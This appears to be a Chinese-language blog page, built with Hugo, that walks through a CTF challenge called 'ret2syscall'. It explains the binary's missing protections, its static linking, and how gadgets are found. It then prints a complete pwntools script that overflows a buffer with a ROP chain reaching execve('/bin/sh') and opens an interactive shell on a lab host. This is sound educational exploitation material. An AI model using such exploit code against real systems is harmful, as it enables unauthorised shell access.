@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2syscall | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：
+可以看到，没有开启栈溢出保护和随机地址。
+那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：
+这个文件是开启了静态编译的。
+文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。
+我们使用IDA，就可以直观的感受到：
+我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。
+然后我们查看是否有/bin/sh字符：
+通过查找，可以看到在程序中确实有/bin/sh字符串。
+虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有
+这道题的思路就是：
+通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。
+#payload.pyfrom pwn import *#p=process(&#34;./ret2syscall&#34;)p = remote(&#39;10.0.25.109&#39;,10004)if args.G:gdb.attach(p)pop_eax_ret = 0x4005afpop_rdi_ret = 0x4006a6pop_rsi_ret = 0x4100f3pop_rdx_ret = 0x448ee5bin_addr = 0x492364syscall = 0x40126cpayload = flat([&#39;a&#39;*120,pop_eax_ret,&#39;\x00&#39;*4,0x3b,&#39;\x00&#39;*4,pop_rdi_ret,&#39;\x00&#39;*4,bin_addr,&#39;\x00&#39;*4,pop_rsi_ret,&#39;\x00&#39;*12,pop_rdx_ret,&#39;\x00&#39;*12,syscall])#payload = b&#39;a&#39;*120 &#43; p64(pop_eax_ret) &#43; p64(0x3b) &#43; p64(pop_rdi_ret) &#43; p64(bin_addr)#payload &#43;= p(pop_rsi_ret) &#43; &#39;\x00&#39;*8 &#43; p64(pop_rdx_ret) &#43; &#39;\x00&#39;*8 &#43; p64(syscall)p.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2syscall/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2syscall" />
+<meta property="og:description" content="注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：
+可以看到，没有开启栈溢出保护和随机地址。
+那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：
+这个文件是开启了静态编译的。
+文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。
+我们使用IDA，就可以直观的感受到：
+我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。
+然后我们查看是否有/bin/sh字符：
+通过查找，可以看到在程序中确实有/bin/sh字符串。
+虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有
+这道题的思路就是：
+通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。
+#payload.pyfrom pwn import *#p=process(&#34;./ret2syscall&#34;)p = remote(&#39;10.0.25.109&#39;,10004)if args.G:gdb.attach(p)pop_eax_ret = 0x4005afpop_rdi_ret = 0x4006a6pop_rsi_ret = 0x4100f3pop_rdx_ret = 0x448ee5bin_addr = 0x492364syscall = 0x40126cpayload = flat([&#39;a&#39;*120,pop_eax_ret,&#39;\x00&#39;*4,0x3b,&#39;\x00&#39;*4,pop_rdi_ret,&#39;\x00&#39;*4,bin_addr,&#39;\x00&#39;*4,pop_rsi_ret,&#39;\x00&#39;*12,pop_rdx_ret,&#39;\x00&#39;*12,syscall])#payload = b&#39;a&#39;*120 &#43; p64(pop_eax_ret) &#43; p64(0x3b) &#43; p64(pop_rdi_ret) &#43; p64(bin_addr)#payload &#43;= p(pop_rsi_ret) &#43; &#39;\x00&#39;*8 &#43; p64(pop_rdx_ret) &#43; &#39;\x00&#39;*8 &#43; p64(syscall)p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2syscall/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2syscall"/>
+<meta name="twitter:description" content="注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：
+可以看到，没有开启栈溢出保护和随机地址。
+那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：
+这个文件是开启了静态编译的。
+文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。
+我们使用IDA，就可以直观的感受到：
+我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。
+然后我们查看是否有/bin/sh字符：
+通过查找，可以看到在程序中确实有/bin/sh字符串。
+虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有
+这道题的思路就是：
+通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。
+#payload.pyfrom pwn import *#p=process(&#34;./ret2syscall&#34;)p = remote(&#39;10.0.25.109&#39;,10004)if args.G:gdb.attach(p)pop_eax_ret = 0x4005afpop_rdi_ret = 0x4006a6pop_rsi_ret = 0x4100f3pop_rdx_ret = 0x448ee5bin_addr = 0x492364syscall = 0x40126cpayload = flat([&#39;a&#39;*120,pop_eax_ret,&#39;\x00&#39;*4,0x3b,&#39;\x00&#39;*4,pop_rdi_ret,&#39;\x00&#39;*4,bin_addr,&#39;\x00&#39;*4,pop_rsi_ret,&#39;\x00&#39;*12,pop_rdx_ret,&#39;\x00&#39;*12,syscall])#payload = b&#39;a&#39;*120 &#43; p64(pop_eax_ret) &#43; p64(0x3b) &#43; p64(pop_rdi_ret) &#43; p64(bin_addr)#payload &#43;= p(pop_rsi_ret) &#43; &#39;\x00&#39;*8 &#43; p64(pop_rdx_ret) &#43; &#39;\x00&#39;*8 &#43; p64(syscall)p."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2syscall",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2syscall/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2syscall",
+  "name": "ret2syscall",
+  "description": "注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：\n可以看到，没有开启栈溢出保护和随机地址。\n那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：\n这个文件是开启了静态编译的。\n文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。\n我们使用IDA，就可以直观的感受到：\n我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。\n然后我们查看是否有/bin/sh字符：\n通过查找，可以看到在程序中确实有/bin/sh字符串。\n虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有\n这道题的思路就是：\n通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。\n#payload.py\rfrom pwn import *\r#p=process(\u0026#34;./ret2syscall\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10004)\rif args.G:\rgdb.attach(p)\rpop_eax_ret = 0x4005af\rpop_rdi_ret = 0x4006a6\rpop_rsi_ret = 0x4100f3\rpop_rdx_ret = 0x448ee5\rbin_addr = 0x492364\rsyscall = 0x40126c\rpayload = flat([\u0026#39;a\u0026#39;*120,pop_eax_ret,\u0026#39;\\x00\u0026#39;*4,0x3b,\u0026#39;\\x00\u0026#39;*4,\rpop_rdi_ret,\u0026#39;\\x00\u0026#39;*4,bin_addr,\u0026#39;\\x00\u0026#39;*4,pop_rsi_ret,\r\u0026#39;\\x00\u0026#39;*12,pop_rdx_ret,\u0026#39;\\x00\u0026#39;*12,syscall])\r#payload = b\u0026#39;a\u0026#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)\r#payload += p(pop_rsi_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(pop_rdx_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(syscall)\rp.",
+  "keywords": [
+    
+  ],
+  "articleBody": "注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：\n可以看到，没有开启栈溢出保护和随机地址。\n那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：\n这个文件是开启了静态编译的。\n文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。\n我们使用IDA，就可以直观的感受到：\n我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。\n然后我们查看是否有/bin/sh字符：\n通过查找，可以看到在程序中确实有/bin/sh字符串。\n虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有\n这道题的思路就是：\n通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。\n#payload.py\rfrom pwn import *\r#p=process(\"./ret2syscall\")\rp = remote('10.0.25.109',10004)\rif args.G:\rgdb.attach(p)\rpop_eax_ret = 0x4005af\rpop_rdi_ret = 0x4006a6\rpop_rsi_ret = 0x4100f3\rpop_rdx_ret = 0x448ee5\rbin_addr = 0x492364\rsyscall = 0x40126c\rpayload = flat(['a'*120,pop_eax_ret,'\\x00'*4,0x3b,'\\x00'*4,\rpop_rdi_ret,'\\x00'*4,bin_addr,'\\x00'*4,pop_rsi_ret,\r'\\x00'*12,pop_rdx_ret,'\\x00'*12,syscall])\r#payload = b'a'*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)\r#payload += p(pop_rsi_ret) + '\\x00'*8 + p64(pop_rdx_ret) + '\\x00'*8 + p64(syscall)\rp.sendline(payload)\rp.interactive() ",
+  "wordCount" : "74",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2syscall/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2syscall
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e6%b3%a8%e5%9b%a0%e4%b8%ba32%e4%bd%8d%e5%92%8c64%e4%bd%8d%e7%a8%8b%e5%ba%8f%e4%bd%bf%e7%94%a8%e7%9a%84%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e5%ad%98%e5%9c%a8%e5%b7%ae%e5%bc%82%e4%bd%bf%e7%94%a8%e6%ad%a4%e6%96%b9%e6%b3%95%e6%97%b6%e8%af%b7%e5%8a%a1%e5%bf%85%e7%a1%ae%e8%ae%a4%e7%a8%8b%e5%ba%8f%e7%9a%84%e4%bd%8d%e6%95%b0" aria-label="注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。">注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。</a><ul>
+                        
+                <li>
+                    <a href="#%e8%99%bd%e7%84%b6%e8%bf%99%e9%81%93%e9%a2%98%e6%9c%89%e5%be%88%e5%a4%9a%e5%87%bd%e6%95%b0%e7%9c%8b%e4%b8%8a%e5%8e%bb%e5%a4%8d%e6%9d%82%e4%bd%86%e6%98%af%e7%9b%b8%e5%ba%94%e7%9a%84%e5%9b%a0%e4%b8%ba%e5%87%bd%e6%95%b0%e5%a4%9a%e9%82%a3%e4%b9%88%e6%88%91%e4%bb%ac%e6%9e%84%e5%bb%bagadget%e4%b9%9f%e9%9d%9e%e5%b8%b8%e7%9a%84%e6%96%b9%e4%be%bf" aria-label="虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便">虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="注因为32位和64位程序使用的汇编语言存在差异使用此方法时请务必确认程序的位数">注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。<a hidden class="anchor" aria-hidden="true" href="#注因为32位和64位程序使用的汇编语言存在差异使用此方法时请务必确认程序的位数">#</a></h3>
+<p>首先先检查一下保护机制：</p>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411102412254.png" alt="image-20220411102412254"  />
+</p>
+<p>可以看到，没有开启栈溢出保护和随机地址。</p>
+<p>那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：</p>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411102854054.png" alt="image-20220411102854054"  />
+</p>
+<p>这个文件是开启了静态编译的。</p>
+<p>文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。</p>
+<p>我们使用IDA，就可以直观的感受到：</p>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411103311007.png" alt="image-20220411103311007"  />
+</p>
+<p>我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。</p>
+<p>然后我们查看是否有/bin/sh字符：</p>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411103731153.png" alt="image-20220411103731153"  />
+</p>
+<p>通过查找，可以看到在程序中确实有/bin/sh字符串。</p>
+<h4 id="虽然这道题有很多函数看上去复杂但是相应的因为函数多那么我们构建gadget也非常的方便">虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便<a hidden class="anchor" aria-hidden="true" href="#虽然这道题有很多函数看上去复杂但是相应的因为函数多那么我们构建gadget也非常的方便">#</a></h4>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411105417720.png" alt="image-20220411105417720"  />
+</p>
+<p>可以看到我们想要的gadget都有</p>
+<p>这道题的思路就是：</p>
+<p>通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。</p>
+<p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411104851147.png" alt="image-20220411104851147"  />
+</p>
+<pre tabindex="0"><code>#payload.py
+from pwn import *
+
+#p=process(&#34;./ret2syscall&#34;)
+p = remote(&#39;10.0.25.109&#39;,10004)
+
+if args.G:
+	gdb.attach(p)
+
+pop_eax_ret = 0x4005af
+pop_rdi_ret = 0x4006a6
+pop_rsi_ret = 0x4100f3
+pop_rdx_ret = 0x448ee5
+bin_addr = 0x492364
+syscall = 0x40126c
+
+payload = flat([&#39;a&#39;*120,pop_eax_ret,&#39;\x00&#39;*4,0x3b,&#39;\x00&#39;*4,
+		pop_rdi_ret,&#39;\x00&#39;*4,bin_addr,&#39;\x00&#39;*4,pop_rsi_ret,
+		&#39;\x00&#39;*12,pop_rdx_ret,&#39;\x00&#39;*12,syscall])
+
+
+#payload =  b&#39;a&#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)
+#payload += p(pop_rsi_ret) + &#39;\x00&#39;*8 + p64(pop_rdx_ret) + &#39;\x00&#39;*8 + p64(syscall)
+
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/ret2syscall.img/image-20220411104648253.png" alt="image-20220411104648253"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2shellcode</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2text/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2text</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
